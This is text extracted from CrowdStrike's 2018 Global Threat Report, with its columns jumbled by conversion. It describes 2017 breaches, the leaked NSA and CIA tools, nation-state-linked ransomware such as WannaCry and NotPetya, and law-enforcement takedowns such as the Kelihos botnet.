The\ntheme of this year’s report, “Blurring the Lines\nBetween Statecraft and Tradecraft,” reflects\nthis disturbing trend.\n\n\nand money went into its development and,\nregrettably, it was leaked.\n\n\nThere are several factors contributing to this\nfundamental leveling of the playing field\nbetween highly skilled — and typically wellfunded — nation-state adversaries and their\nless sophisticated criminal and hacktivist\ncounterparts. One of the biggest contributors\nis the “trickle-down effect” present in the\ncyberthreat arena.\n\nThe idea of trickle-down is not new. In fact,\nit’s precisely how state-sponsored research\nand development programs are supposed\nto work: Governments fund development\nof sophisticated technologies, and those\neventually get transferred out to the private\nsector as products and services. Consider\nGPS. It was originally designed for military\napplications, from missile targeting to tracking\nobjects and assets on the ground. Now\neveryone has GPS in their pocket, and in their\ncar. It’s so ingrained in our daily lives, it’s\nhard to remember how we ever managed\nwithout it. That’s a textbook example of how\ngovernment-sponsored technology can\nsuccessfully trickle down to the masses.\n\nUnfortunately, there’s also a dark side to this\nphenomenon. That was certainly the case with\nWannaCry. This crippling malware epidemic\nwas based on military-grade espionage\ntechniques around a Windows vulnerability\nknown as EternalBlue, which ultimately fell into\nthe wrong hands. A great deal of effort, time\n\n\n###### The result of trickle-down in the field of cybersecurity has been a proliferation of military-grade weaponry for cyberwarfare being pushed down into the masses and commoditized.\n\nThe consequences to legitimate organizations\nhas been alarmingly clear. What makes these\nattacks so effective is that they are essentially\nimmune to the traditional endpoint defense\ntechnologies that most organizations have\nrelied on for the past 20 or more years.\n\nAs this report points out with great clarity, it’s\ntime for the good guys to step up. Defending\nagainst “government-grade” attacks requires\nenlisting a host of new security technologies\nand approaches that go beyond the simple\nsignature-based prevention of the past. Check\nthe Recommendations section of this report\nfor actionable steps each of us can take to\ncombat the potentially disastrous effects of\ntrickle-down cyberattacks.\n\nI sincerely hope that this document helps your\nunderstanding of important shifts in the threat\nlandscape, and provides the information you\nneed to make your organization more resilient,\nmore prepared and better protected, so that\ntogether, we can stop breaches.\n\n###### GeorgeKurtz\n\n George Kurtz\nCrowdStrike CEO and Co-Founder\n\n\n-----\n\n###### 4 5\n\n EXECUTIVE SUMMARY\n\n\nupdate packages was a rising TTP. This malware\ndissemination technique was notably used in\nthe NotPetya campaign in late June 2017, but it\nwas observed throughout the year from eCrime\nand targeted intrusion adversaries. Underlying\nall of these TTP trends is an overall effort to avoid\nattribution, blend in with the crowd and otherwise\nchallenge the computer network defender.\n\n\nand 58 minutes. Breakout time indicates how\nlong it takes for an intruder to jump off the initial\nsystem (beachhead) they had compromised\nand move laterally to other machines within the\nnetwork. This statistic shows how much time\non average defenders have to detect the initial\nintrusion, investigate it and eject the attacker\nfrom the network before they bury themselves\ndeeper and steal or destroy sensitive data, which\ncan make remediation much more complex.\n\n\n###### Blurred Lines\nThe blurring of lines referenced in the title of\nthis report has manifested in various ways in\nthe past year. In many cases, less technically\nadept actors “upped their game” by employing\nTTPs that would normally be above their\npay grade. In other instances, state-affiliated\nactors known for their highly evolved targeted\nintrusion TTPs took a page from lowerechelon eCrime adversaries. For example, the\nWannaCry and NotPetya attacks heralded the\nrise of nation-state-sponsored ransomware,\nas CrowdStrike Falcon Intelligence and other\norganizations linked the malware and TTPs\nused in these operations to the Democratic\nPeople’s Republic of Korea (DPRK) and Russia,\nrespectively. Although the repurposing of\ncriminal malware is not a new phenomenon\n(particularly for Russian adversaries), this is a\n\n\nnotable trend considering ransomware’s rapid\ngrowth in 2016 and 2017, suggesting targeted\nintrusion adversaries are taking note of what\nis successful in the eCrime marketplace.\nLikewise, WannaCry and NotPetya appeared\nto influence criminally motivated adversaries\nwhen a rise in the use or development of\nServer Message Block (SMB) spreading\ntechniques appeared in eCrime operations in\nthe late summer of 2017.\n\n###### Expanding Exploits\nExploits continue to proliferate across the\nthreat landscape, as was observed in the rapid\nspread of CVE-2017-0199, among others. Actoragnostic TTP trending also showed a rise in\nthe use of commodity tools and penetrationtesting software (e.g., Cobalt Strike). Supply\nchain attacks incorporating poisoned software\n\n\n###### Score One For The Good Guys\nThe coordinated multi-agency takedowns\nof major eCrime actors and networks during\n2017 helped balance the scales and disrupt\noperations of profit-driven cybercrime groups.\nGiven the tenacity and anonymity that surrounds\nmany cybercriminals, law enforcement actions\nsuch as takedowns, arrests, and the sentencing\nof individuals who are involved in cybercrime\nare major successes for law enforcement\nagencies. These actions often temporarily\nsplinter the criminal community, as actors\nexamine their operational security and look for\nalternative methods for committing their crimes.\n\n###### Undetected Malware and Breakout Time\nAlthough an interesting trend observed during\nthe past year was an increase in malwarebased over malware-free attacks, a more\nsobering finding was that 39 percent of all\nincidents in 2017 were malicious software\nthat went undetected by traditional antivirus,\nleaving organizations relying on these legacy\nsolutions openly vulnerable to these threats\nand demonstrating a need for next-generation\nendpoint protection.\n\nAccording to incidents CrowdStrike investigated,\nthe average “breakout time” in 2017 was 1 hour\n\n\n###### Get A Room\nWhile government, healthcare and financial\norganizations remained among the most\npreferred prey of eCrime and targeted intrusion\nactors, the hospitality sector emerged in the\npast year as a growing target for criminals and,\nin a more unsettling turn, nation-state adversary\ngroups, as well. International hotel chains, in\nparticular, offer ripe picking for financial crimes,\nfrom stealing identities to pilfering credit card\nnumbers via point-of-sale transactions. Stateaffiliated adversaries have also developed a\ndeep interest in the lodging sector, whether\nfor tracking persons of interest while they are\ntraveling, or to enable access to these potential\nvictims when they use electronic devices\noutside the confines of protected networks.\n\n––––––––––––––––––\n\n**Numerous additional insights are contained**\n**in the pages that follow. These findings have**\nbeen organized into three dovetailed sections,\nrepresenting the research conducted in 2017\nby CrowdStrike’s threat intelligence, managed\nhunting and Threat Graph data collection and\nanalysis units.\n\n\n-----\n\n###### 6 7\n\n\n###### METHODOLOGY NAMING\n The information in this report was compiled\n using the following resources:\n CONVENTIONS\n This report follows the naming conventions instituted by CrowdStrike Falcon Intelligence, which categorizes adversaries according to their nation-state affiliations or motivations (e.g., eCrime or hacktivist). The following is a guide to these adversary naming conventions.\n\n\n###### Falcon Intelligence™\nThe CrowdStrike Falcon Intelligence team\nprovides in-depth and historical understanding\nof adversaries, their campaigns and their\nmotivations. The global team of intelligence\nprofessionals tracks 95 adversaries of all types,\nincluding nation-state, eCrime and hacktivist\nactors. The team analyzes adversary tools,\ntactics and procedures (TTPs) to deliver indepth, government-grade intelligence to\nenable effective countermeasures against\nemerging threats.\n\n###### Falcon OverWatch™\nCrowdStrike Falcon OverWatch provides\nproactive threat hunting conducted by a team\nof experienced threat hunters providing 24/7\ncoverage on behalf of CrowdStrike customers.\nIn 2017, OverWatch identified and helped stop\nmore than 20,000 breach attempts, employing\nexpertise gained from daily “hand-to-hand\ncombat” with sophisticated adversaries. The\nOverWatch team works to identify hidden threat\nactivity in customers’ environments, triaging,\ninvestigating and remediating incidents in\nreal time.\n\n###### CrowdStrike Threat Graph™\nAs the brains behind the CrowdStrike platform,\nThreat Graph is a massively scalable, cloudbased graph database model custom built\nby CrowdStrike. It processes, correlates and\nanalyzes petabytes of real-time and historical\n\n\ndata collected from over 90 billion events a\nday across 176 countries. The Threat Graph\narchitecture combines patented behavioral\npattern matching techniques with machine\nlearning and artificial intelligence to track\nthe behaviors of every executable across\nCrowdStrike’s global customer community.\nThis combination of methodologies enables\nthe identification and blocking of previously\nundetectable attacks, whether or not they\nuse malware.\n\n###### CrowdStrike Services\nThis report references the CrowdStrike\nServices organization and its annual report,\nthe \"CrowdStrike Cyber Intrusion Services\nCasebook,\" which recounts real-life client\nincident response (IR) engagements handled\nby the services team. In addition to hands-on IR\nservices conducted by its team of professional\ninvestigators, CrowdStrike Services provides\nproactive services such as cybersecurity\nmaturity assessments, IR policy and playbook\ndevelopment, tabletop exercises, red teaming\noperations and compromise assessments.\nResponse and remediation services are\nconducted by highly experienced IR experts who\ninvestigate breaches to determine how attackers\naccessed a client’s environment; mitigate\nattacks and eject intruders; and analyze attacker\nactions and provide clients with actionable\nguidance to prevent future adversary access.\n\n|Adversary|Category or Nation-State|\n|---|---|\n|BEAR|Russian Federation|\n|CHOLLIMA|Democratic People's Republic of Korea (North Korea)|\n|JACKAL|Hacktivist|\n|KITTEN|Iran|\n|LEOPARD|Pakistan|\n|PANDA|People’s Republic of China|\n|SPIDER|eCrime|\n|TIGER|India|\n\n\n-----\n\n###### 8 9\n\n\n###### TABLE OF CONTENTS\n\n\n###### 03 04 06 07 10 10 11 16 17 24 25 30 35 38 40 42 45 48 52 53 56 58 58 59 63 64 65 65 66 70 71 73 73 73 75 78\n\n\n###### Foreward Exec Summary Methodology  Naming conventions FINDINGS PART 1: CROWDSTRIKE FALCON INTELLIGENCE Introduction Weaponization of Data Middle Eastern Origins The Takedown Effect TARGETED INTRUSION China Russia Iran North Korea (DPRK) Other Adversaries ECRIME Banking Trojans Targeted eCrime HACKTIVISM 2018 Outlook CONCLUSION FINDINGS PART 2: CROWDSTRIKE FALCON OVERWATCH Introduction Hospitality Sector Heavily Targeted throughout 2017 Intrusion Campaign Against Legal Sector Uses PowerShell-GitHub-Shell Growing Tensions Between U.S. and DPRK Coincide with CHOLLIMA Activity Suspected KITTEN Attacks Target Middle East PANDA Actor Harvests Call Data from Telecommunications Provider PANDAs Increase Their Targeting of Western Policy-Focused NGOs FINDINGS PART 3: CROWDSTRIKE THREAT GRAPH Background Recent Attack Types and Their Targets Using Threat Graph Telemetry Dwell Time and Lateral Movement Speed Antivirus Effectiveness Malware-Free Attacks by Industry RECOMMENDATIONS\n\n\n-----\n\n###### 10 11\n\n Weaponization of Data Figure 1\n Findings Part 1 Reported Data\n\nOn September 7, 2017, consumer credit reporting agency Compromises per Industry\nEquifax announced a cybersecurity incident potentially\nimpacting more than 143 million U.S. consumers, making this\nincident one of the largest reported breaches of 2017. Although\nsuch big events garner headlines, the scale of the problem\ncan be obscured by the sheer volume of data breaches\nthat occur on a daily and weekly basis.

At least half\nof these reported incidents concerned smaller organizations Healthcare\n— city-level entities in the case of the government, and\nlocal hospitals and doctors’ offices in the case of healthcare.\nThe high percentage of occurrences in these sectors may\nbe due to penalties imposed on organizations for failure to\nreport a data exposure. Regardless, the evidence shows that\nransomware and extortion attacks are extremely common in Financial\n\n# FALCON both sectors.\n\nFinancially motivated adversaries targeted retail and\nhospitality sectors with attacks focused on point-of-sale (PoS)\ndevices, an operational model that often results in the resale Media & Entertainment\nof stolen credit cards in criminal marketplaces.

While not attributed to a particular\n\nTravel\n\nactor, open-source reporting has indicated investigators\n\n###### information to better defend your organization. are researching whether a state-sponsored adversary is Academia\n\nComputer Gaming\n\nresponsible. Previously, Chinese state-sponsored actors were Engineering\nlinked to large-scale data breaches at health insurers and the Energy\nU.S. Office of Personnel Management (OPM) in 2015. As was Maritime\n\nProfessional Services\n\nthe case with these previous breaches, and those that fueled\n\nNGO\n\nthe Shadow Brokers and WikiLeaks releases this year (noted Sports Org\nbelow), the effects of many of the reported breaches of 2017\nmay not be known for some time.\n\n\n-----\n\n###### 12 13\n\n\n###### Data from Previous Breaches of U.S. Intelligence Agencies Released\n\nThe U.S. intelligence community was particularly\naffected by data breaches. These include public\ndisclosures of purported tools used by the\nCentral Intelligence Agency (CIA) via WikiLeaks\nthroughout 2017, and the Shadow Brokers’\nleak of National Security Agency (NSA) tools\nand exploits in April of that year. Although both\nbreaches likely occurred prior to 2017, serious\neffects of the leaks were more fully realized\nin 2017.\n\n**Shadow Brokers**\nOn April 8 and April 14, 2017, the Shadow Brokers\nthreat actor announced the public disclosure of\ntools and exploits, which they claim were used\nby the targeted intrusion adversary publicly\nknown as the Equation Group. The April 8 release\npurportedly included Unix tools and exploits.\nThe April 14 release included exploits and\ntools designed to target several versions of the\nWindows operating system and related\nenterprise software.\n\nIncluded in the leaked tools were the\nEternal family of exploits/vulnerabilities and\nthe backdoor DoublePulsar. These were\nincorporated by a large number of malicious\nadversaries. The EternalBlue vulnerability in\nparticular fueled fast-propagating operations\nsuch as WannaCry and NotPetya. Additional\neCrime operations, which did not explicitly\ninclude Eternal exploits, were nevertheless\ninspired to experiment with SMB-spreading\nmechanisms.\n\n**WikiLeaks Vault 7 and Vault 8**\nOn March 7, 2017, WikiLeaks began publishing\ndocuments under a program dubbed Vault 7.\nSubsequent releases occurred every one to\ntwo weeks until September 2017. For the Vault 7\nreleases, WikiLeaks disclosed the configuration,\ninstallation and operation manuals for many\npieces of malware, but did not release specific\nexploit or malware code for any of these\nproducts. This decision was amended for the\nVault 8 releases, which began on Nov. 9, 2017.\nThe aim for Vault 8 appears to be to provide\nsource code and analysis for CIA cyber tools,\nincluding those described in the previous Vault\n7 series.\n\n\nWikiLeaks claimed that the purpose of this\nseries of leaks was “to initiate a public debate\nabout the security, creation, use, proliferation\nand democratic control of cyber weapons.”\nThe effect of Vault 7 was likely an international\nawareness of the capabilities of the U.S.\nintelligence community. With the decision to\ninclude source code in the Vault 8 releases,\nthe chances of malicious tools being\nrepurposed increases significantly.\n\n###### Self-Serving Extortion Actors\n\nAlthough not all data exposures are the result\nof malicious actors, several significant breaches\noccurred in 2017, highlighting the need for\ntighter security over data and the popularity of\ndata acquisition by a variety of actors intent on\nransoming or otherwise monetizing it.\n\n**OurMine: Self-Proclaimed Gray Hat Group**\nCrowdStrike Falcon Intelligence saw renewed\nactivity from the self-styled security group\nOurMine. This adversary appears to be a\nfinancially motivated gray-hat-like group that\ncompromises social media accounts and\nwebsites, stealing data in order to publicly\nshame companies, then urging them to buy\ntheir security services. Despite its claim to now\nrepresent a legitimate company, OurMine team\ntactics can still be characterized as extortive.\nThis group claimed to have compromised both\nHome Box Office (HBO) and Sony PlayStation\nNetwork (PSN), which demonstrates a focus on\nentertainment and technology sector victims.\nFalcon Intelligence assesses that OurMine\ncomprises multiple members, some of\nwhom reside in Saudi Arabia.\n\n**OVERLORD SPIDER: Aggressively Monetizing**\n**High-Profile Data**\nThis adversary targets entertainment and\nhealthcare sector targets with undisguised data\nextortion attacks. OVERLORD SPIDER relies on\nthe relatively poor security practices of small or\nless-sophisticated firms, and takes advantage of\nthe potential legal, financial and public relations\nliabilities resulting from the potential loss of\ncustomers’ data. Thus, the main extortive threat\nfrom this actor involves the release of personally\nidentifiable information (PII) belonging to highprofile customers of the victim company. To raise\nawareness of the breach, OVERLORD SPIDER\n\n\noften conducts aggressive dissemination efforts\n— naming the victim in social media, for example,\nand interacting with technology journalists.\n\n\nThe actor has identified Bitcoin (BTC) as its\npreferred method of data ransom payment.\n\n\n###### 2018 Data Breaches & Exposure  Outlook A third of all CrowdStrike reporting on data breaches references inadvertent or accidental disclosure, but even these unintentional exposures can lead to malicious activity. Actors across the motivation spectrum have taken advantage of unsecured data.\n\n\n###### State-Sponsored Ransomware\n\nThis year was punctuated by high-profile\ncampaigns linked to nation-states in which\nransomware may have been used for\nfinancial or disruptive purposes, or instances\n\n\nwhere destructive malware was disguised\nas ransomware. What was once a criminally\nmotivated operation model appears to have\nbeen adopted by nation-states that are seeking\nalternative sources of income (e.g., DPRK) or a\nmeans to disable opponents (e.g., Russia).\n\n\n**Table 1**\nRansomware\n\nCampaigns\nwith Possible\nor Confirmed\nLinks to Targeted\n\nIntrusion\nAdversaries\n\n\n**VenusLocker**\nSouth Korea Possibly DPRK N/A N/A\n**RoK cluster**\n\n**WannaCry** Worldwide DPRK N/A ✔✅\n\n**XData** Ukraine Russia Possible N/A\n\nUkraine, but other\n**NotPetya** Russia ✅ ✔✅ ✅ ✔✅\ncountries impacted\n\nPossible: May be geopolitically\n**IsraBye** Israel ✅ ✔✅ N/A\nmotivated hacktivist activity\n\n**BadRabbit** Ukraine, Russia Russia N/A N/A\n\nPossible: Targeting suggests\n**Tyrant** Iran N/A N/A\nnexus to Iranian government\n\n\n**Malware** **Target** **Nation-State Linked** **Destructive** **Use of**\n**EternalBlue**\n\n\n-----\n\n###### 14 15\n\n\n###### WANNACRY\n\n**Heralding the Rise**\n**of Nation-State Linked Ransomware**\nOn May 12, 2017, a new ransomware family called\nWannaCry began making headlines as it rapidly\ninfected the networks of organizations across the\nglobe. The scale of this attack, which expanded\nrapidly over the course of a single day, was\nunique. The authors of this malware incorporated\nsophisticated propagation techniques, leveraging\nthe recently released EternalBlue vulnerability\n(CVE-2017-0144) and the DoublePulsar\nbackdoor. The self-propagation aspect of this\nmalware ensured a high infection rate among\n\n\norganizations that had not yet implemented the\nassociated updates to their systems.\n\nThe demand for Bitcoin and indiscriminate\ntargeting profile suggests that the adversary\nbehind this campaign was financially motivated,\nmuch like previously observed eCrime threats.\nHowever, code overlaps with malware linked\nto DPRK adversaries implied this operation was\nstate-sponsored. Following months of reporting\nthat intelligence agencies had attributed the\nattack to DPRK state-sponsored actors, on Dec.\n18, 2017, the U.S. government directly credited\nNorth Korea with creating and distributing the\nmalware.\n\n\nIn addition to the use of EternalBlue in the\nNotPetya campaign, these operations leveraged\nmultiple TTPs to infect devices and propagate\nthese ransomware variants. These TTPs\nincluded supply chain interdiction, strategic\nweb compromises and credential harvesting to\nfacilitate propagation. In the case of NotPetya\nspecifically, file recovery was not possible,\nindicating this was not a financially motivated\noperation, but rather a destructive attack\ndisguised as ransomware. These TTPs, as well\nas the choice of targets, suggest this operation\nis aligned with Russian state-sponsored hackers.\n\n\n###### From NotPetya to BadRabbit\n\n**A Series of Ransomware and Pseudo-**\n**Ransomware Campaigns Targeted Ukraine**\nOn June 27, 2017, another apparent ransomware\nvariant named NotPetya began to spread\nglobally using the EternalBlue vulnerability.\nThis activity initially elicited comparisons to\nthe WannaCry campaign. However, technical\nanalysis revealed an extensive operation using\nseveral ransomware variants that appeared to\nspecifically target Ukrainian users.\n\n\nCriminal ransomware\n**May 18** XData M.E.Doc update\nAES-NI\n\n**June 22** PSCrypt N/A Unsecured RDP ports\n\nWannaCry in\n**June 26** FakeCry M.E.Doc update\nappearance only\n\n\n**DATE** **Malware** **CODE OVERLAP** **Infection Vector**\n\n\n**Table 3**\nRansomware\n\nEvents\nTargeting\n\nUkraine\n\n\nInitial infections of NotPetya appeared on\nsystems running a legitimate updater for the\ndocument management software M.E.Doc.\nUkrainian companies and companies operating\nin Ukraine rely on the M.E.Doc software to\nmaintain tax information and payroll accounting.\nSubsequently, CrowdStrike Falcon Intelligence\nwas able to confirm through Falcon telemetry\nthat M.E.Doc updates were an initial infection\nvector for NotPetya. Additional reports indicate\nthat a separate malware family, XData, was also\npushed by these software update packages\nas early as May 2017. Falcon Intelligence\nassesses it is highly likely that Russia-based\nadversaries had awareness of M.E.Doc, given\nthe widespread integration of this software into\nbusiness and government communications.\n\n\n**TwoPence**\nSTARDUST\nCHOLLIMA\n\n\n**Table 2**\nCode Overlaps\nBetween\nWannaCry\nand DPRK\nAdversary\nTools\n\n_Technical analysis of_\n_the toolset used by_\n_DPRK adversaries has_\n_supported a code-_\n_sharing hypothesis_\n\n\n**Characteristic** **WannaCry**\n\n\n**Hawup RAT**\n\nLABYRINTH\n\nCHOLLIMA\n\n\n**Generation of fake TLS handshake** ✔ ✔ ✔\n\n**Preference for Microsoft Visual Studio 6.0** ✔✅ ✔ ✔✅\n\n**Contains code based on minizip** ✔ ✔ ✔\n\n\n**June 27** NotPetya Petya\n\n\nM.E.Doc update, SWC\ncampaign, EternalBlue\npropagation\n\n\n**Deployed through a dropper that extracts**\n**payload from an embedded password-**\n**protected drive**\n\n\n✅ ✔✅ ✅ ✔✅\n\n\n**Oct. 24** BadRabbit NotPetya SWC\n\n\n**Conversion routine for hand-coded**\n###### ✔ ✔\n**cryptographic data**\n\n**API functions resolved dynamically** ✔ ✔\n\n\nMany of these campaigns appeared to imitate\nransomware on the surface. However, the true\nintent of these operations was not financial\ngain, as is typically the case with ransomware\n— it was to destroy data on targeted networks.\nThe XData campaign, for example, did not\nprovide a payment amount or guidance on\nhow file recovery could occur. The operators of\nNotPetya initially offered an email to facilitate\npayment, but this address was suspended\nshortly after news of the malware broke. A\ntruly financially motivated actor likely would\nnot have implemented such a fragile payment\nmechanism, indicating the motivation for\nthe actor behind NotPetya was not financial\ngain, but rather data destruction. Moreover,\n\n\nFalcon Intelligence has previously assessed\nthat North Korean adversaries use cyber\noperations to acquire funds and foreign\ncurrency for the Kim regime. Throughout the\nlatter half of 2017, LABYRINTH CHOLLIMA\nappears to have increased the number of\ncryptocurrency-themed spear-phishing\ncampaigns, suggesting a high level of interest\nin Bitcoin and the acquisition of cryptocurrency.\n\nFurthermore, WannaCry was not the first\n\n\nattempt by DPRK actors to use ransomware.\nSensitive source reporting identified an\nearlier campaign, allegedly active between\nDecember 2016 and March 2017, that leveraged\nthe commodity ransomware VenusLocker.\nSamples from this cluster of VenusLocker\nactivity featured the ability to encrypt Hangul\nWord Processor (HWP) and a Korean-language\nextortion message, suggesting South Korea\nwas a specific target for this operation.\n\n\n-----\n\n###### 16 17\n\n\nthe developers of NotPetya altered Petya\nransomware to erase the decryption key after\nencrypting the master file table (MFT). This\ntechnique offers no method to recover the files,\nmaking NotPetya a wiper, not ransomware.\nIt should also be noted that the NotPetya\ndevelopers altered the Petya binary, suggesting\nthe adversary did not have access to the source\ncode, and therefore, reverse-engineered the\nmalware. This also reaffirms the assessment\nthat NotPetya and Petya were created by\nseparate developers.\n\nThe NotPetya successor BadRabbit adhered\nmore closely to the designation of ransomware,\ntechnically enabling data recovery, although\nthe process for acquiring a recovery key did not\nappear to be user-friendly and it is unknown\n\n###### Middle East Origins\n\n IsraBye\n\nDiscovered in early August 2017, IsraBye is a\nwiper that displays a ransom message listing\nfictitious conditions for file recovery. Technical\nanalysis indicated the developer likely intended\nthat the files be destroyed permanently.\nWhen executed, the malware displays antiIsraeli and pro-Palestinian imagery, rhetoric\nand audio content on victim machines while\noverwriting files and appending their names\nwith the .israbye suffix. The displayed content\ncontained references to the Al Aqsa Mosque\ncompound, reinforcing the intended timing of\nthis operation, which coincided with clashes\nsurrounding controversial July 2017 security\nmeasures put in place by Israeli security\nservice at the Al Aqsa compound. The antiIsrael content and the timing of this malware\noperation indicate that it was almost certainly\npolitically motivated. Multiple elements of the\nwiper are indicative of a hacktivist developer.\nFor instance, the background image used\nfor the wiper is identical to a defacement\npage used by the Palestinian hacktivist group\nGiant’s-ps.\n\n\nwhether the attacker would have responded\nwith the required information. The lack of\nconcern for file recovery strongly suggests the\nadversary is not financially motivated, but rather\nseeking to harass the victim organizations —\nand possibly to erode trust in the networks that\nsupport a variety of essential functions for the\naffected companies and government entities.\n\nMasking these attacks as eCrime is reminiscent\nof a Russian military doctrine known as\nmaskirovka, which features deception,\nconcealment and disguise. The goal of\nmaskirovka is not only to deceive or confuse\nan adversary, but also to hide the true origin or\nintent of an operation. Although NotPetya was\neventually revealed to be a wiper, the veneer of\nransomware delayed this initial assessment.\n\n###### Tyrant and WannaSmile\n\nThroughout the latter part of 2017, Falcon\nIntelligence observed an increase in\nransomware attacks targeting internet users in\nlocations where the Farsi language is spoken.\nOpen-source reporting listed at least two\nrecent cases, in October and November 2017,\ninvolving ransomware families called Tyrant\nand WannaSmile. Although reports suggested\nthese cyber operations were criminal in nature,\nFalcon Intelligence assesses that both the\nIranian government and state-sponsored actors\ncould have equal motivation for conducting\nthese attacks.\n\nAccording to an Iranian government authority,\nthe Psiphon virtual private network (VPN)\nsoftware was spoofed by the purported\noperators of the Tyrant campaign and used\nto distribute the ransomware. Psiphon is used\nto evade government censorship and filtering\nefforts, and thus, this software and its users are\nlikely targets for the Iranian government. Iran\nhas an extensive history of targeting popular\napplications such as Psiphon with restrictions\n\n\nand strict regulations. If the Tyrant operation\nwas motivated by domestic security interests,\nthis case highlights the potential that the Iranian\n\n\nFalcon Intelligence reported on several law\nenforcement actions targeting cybercrime\n(see Figure 2). Such efforts included arrests,\nbotnet takedowns, shutting down forums\nassociated with criminal activity, and legal\ninjunctions against infrastructure. In some\ncases, these operations require cooperation\namong multiple international law enforcement\nagencies with assistance from private and\nnon-profit cybersecurity elements. The ZOMBIE\nSPIDER takedown, described below, is a\nnotable example of how broad support for a\n\n\ngovernment uses the cover of cybercrime\noperations to disrupt or poison the uptake of\nsoftware such as Psiphon.\n\n\n###### 2018 Nation-State-Linked and Targeted Ransomware Outlook High-profile attacks in 2017 have introduced the possibility that ransomware could be used for geopolitical, and even militaristic, purposes. It is possible this trend of nation-state ransomware has plateaued, but it is even more likely that other nations — perhaps smaller countries — or even hacktivist groups will use ransomware and pseudo-ransomware wipers to disrupt victims, eroding trust between vital businesses and their customers or between governments and their constituencies.\n\n In 2017, these attacks used TTPs that were novel and trending in 2017, including the use of the EternalBlue vulnerability and the compromise of software update supply chains. Incidents described here can be characterized by the combination of eCrime ransomware operations and targeted intrusion techniques. Therefore, in 2018 and beyond, new campaigns could incorporate the latest vulnerabilities or additional TTPs that have not been previously observed or associated with ransomware campaigns.\n\n The Takedown Effect\n\n\nlaw enforcement operation can create a ripple\neffect in the eCrime ecosystem.\n\nAn example of this ripple effect was observed\nin July 2017, with the takedowns of the\ndarknet markets AlphaBay and Hansa, a\ncollaboration between multiple international\nlaw enforcement agencies — notably, the Dutch\nNational Police and the U.S. Federal Bureau\nof Investigation (FBI). In combination with the\ncollapse of TradeRoute, the operation against\nAlphaBay and Hansa has led to months of\n\n\n-----\n\n###### 18 19\n\n\ndisarray for centralized darknet markets.\n\nOn a smaller scale, legal proceedings can be\nan effective means to handle individual eCrime\nactors. In December 2017, individual affiliates of\n\n\nboth HOUND SPIDER and INDRIK SPIDER faced\nlegal action. Although these arrests may not\ndismantle the larger criminal enterprise, they\ncan prompt other actors to examine the risks\nthey are taking when engaging in cybercrime.\n\n**November 30**\n\nDeveloper of Citadel Andromeda\nmalware sentenced takedown\nto five years in prison\nby U.S. courts\n\n**December 12**\n\nDoJ announces UK-based supporter\ntakedown of of INDRIK SPIDER\ndarknet markets sentenced\nAlphaBay & Hansa\n\n**December 20**\nHOUND SPIDER\n\n**Darknet markets remain in disarray** affiliates arrested\n\nin Romania\n\n\n(developed by BAMBOO SPIDER), Gozi ISFB and\nNymain, as well as large-scale phishing and\n“pump-and-dump” stock campaigns. Prior to\nthe takedown operation, Kelihos was one of the\nlargest spam botnets on the criminal market.\nIt was originally estimated that an average of\n40,000 machines were connecting to the P2P\n\n\n###### CrowdStrike previously reported on Levashov’s potential affiliation with the Russian government. In a forum post from 2013, his Severa persona discussed an offer that he allegedly received from the FSB to lead a team in protecting Russia from electronic threats and providing a reactive response, if required. If this forum post was indeed legitimate, it provides a unique insight into the FSB’s recruitment campaigns and the suspected hiring of criminal actors. It also hints that the Russian government will overlook criminal acts, particularly operations that target Western nations, if they benefit the Russian state. This provides cybercriminals who operate out of Russia a safe haven, and potential job opportunities within the Russian government in addition to their criminal enterprises. This aligns with Russia’s previous warning to its citizens against traveling to countries that have\n an extradition treaty with the United States, due to the possibility of arrest and prosecution.\n\n\nnetwork per day, but following the takedown\noperation, it was discovered that the number\nof machines was in fact approximately 70,000\nper day. In its final weeks of operation, Kelihos\npredominantly supported campaigns for Shade\nransomware, Cerber ransomware, bank phishing\nscams and money mule lures.\n\n\n**Figure 2**\nTimeline of\nNotable Law Enforcement Link\nEvents in 2017\n\n###### to Russian On Oct. 3, 2017, a Spanish court decided to extradite Levashov to the United States, an action Government that the Russian Federation attempted to block by filing a counter-extradition request on Sept.\n 22, 2017. Levashov’s defense claimed that he had \"access to information constituting state secrets through the university in St. Petersburg.\" Furthermore, during the court proceedings, Levashov claimed that he had worked for the United Russia Party for 10 years as an officer in the Russian Army by “collecting various information on opposition parties.” According to\n open-source reporting, United Russia has denied this claim.\n\n|Col1|January 13 Creator of Limitless Logger pleads guilty in U.S. courts January 20 April 7 Russian operator ZOMBIE SPIDER of Neverquest takedown arrested in Spain Incremental adjustments to|July 20 Developer of Citadel malware sentenced to five years in prison by U.S. courts July 20 DoJ announces takedown of darknet markets AlphaBay & Hansa spam botnet market Darknet markets remain in disarray|Novemb Androme takedown Dece UK-b of IND sente De HO affi in|\n|---|---|---|---|\n\n\nJAN FEB MAR APR MAY JUN JUL AUG SEP OCT NOV DEC\n\n###### 2017\n\n\n###### The Fall of ZOMBIE SPIDER\n\nOn April 7, 2017, Pytor Levashov — who\npredominantly used the alias Severa or Peter\nSevera and whom Falcon Intelligence tracks\nas ZOMBIE SPIDER — was arrested in an\ninternational law enforcement operation led\nby the FBI. ZOMBIE SPIDER’s specialty was\nlarge-scale spam distribution, a fundamental\ncomponent of cybercrime operations. Levashov\nwas the primary threat actor behind a botnet\nknown as Kelihos and its predecessors, Waledac\nand Storm. In addition to Levashov’s arrest, there\nwas a technical operation conducted by Falcon\nIntelligence to seize control of the Kelihos botnet.\n\nThe Kelihos botnet was a peer-to-peer (P2P)\nbotnet that used infected systems as proxies\nto relay information between each other and\nthe Kelihos backend servers. In order to seize\ncontrol of Kelihos, Falcon Intelligence leveraged\na technique known as peer list poisoning. This\n\n\nprocess propagated a carefully crafted peer\nlist that prevented the threat actor (in this case\nZOMBIE SPIDER) from communicating with\ninfected systems. As a result of the peer list\npoisoning, the P2P network was transformed\ninto a centralized network, with infected\nhosts only being able to communicate with\nthe sinkhole operated by Falcon Intelligence.\nThe IP address victim information collected\nby the sinkhole was distributed by the nonprofit organization Shadowserver to global\ninternet service providers (ISPs) and computer\nemergency response teams (CERTs) to assist\nwith remediation efforts.\n\nZOMBIE SPIDER provided criminal services to\na large number of affiliates, with Kelihos spam\ncampaigns varying greatly over the years.\nAlthough pharmaceutical spam was a threat\nconsistently supported throughout Kelihos’\nlifespan, the botnet was also used to distribute\nmajor banking Trojans such as Panda Zeus\n\n\n###### Observed Changes\n to eCrime Distribution\n\nWith the Kelihos spam botnet no longer in\noperation and ZOMBIE SPIDER behind bars,\nmultiple criminal operators moved to different\ndistribution methods. For example, Falcon\nIntelligence has observed the Cutwail spam botnet\ndistributing Gozi ISFB and the Magnitude exploit\nkit distributing Cerber ransomware.\n\n\nMONTY SPIDER, operator of the CraP2P spam\nbotnet (aka 